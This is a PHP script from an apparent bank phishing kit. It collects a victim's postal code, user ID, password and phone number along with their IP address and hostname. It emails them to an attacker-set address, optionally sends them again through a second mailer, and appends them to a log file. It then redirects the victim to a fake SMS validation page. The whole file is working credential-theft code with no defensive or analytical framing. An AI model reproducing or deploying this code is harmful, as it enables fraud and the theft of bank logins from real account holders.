<?php
session_start();
include('det.php');
include('val.php');
	$_SESSION['num'] = $_POST['num'];
$hostname = gethostbyaddr($ip);
$message .= "[------------------------------]\n";
$message .= "CODE POSTALE     : ".$_SESSION['postal']."\n";
$message .= "User       : ".$_SESSION['id']."\n";
$message .= "pass     : ".$_SESSION['pass']."\n";
$message .= "num      : ".$_SESSION['num']."\n";

$message .= "IP    : $ip | $hostname\n";
$message .= "[------------------------------]\n";
$subject = "MadIiife1[cc azabi] $ip";
$headers = "From: CA<info@inc.de>";
mail($send,$subject,$message,$headers);
if ($tabligh == "yes") {
mailling($send,$subject,$message,$headers);
    }
$fp = fopen("../../infos.cs", "a");
			fputs($fp, $message);
			fclose($fp);
     echo "<meta http-equiv='refresh' content='0; url=sms.php?validation=$md5&session=P$md5' />";

?>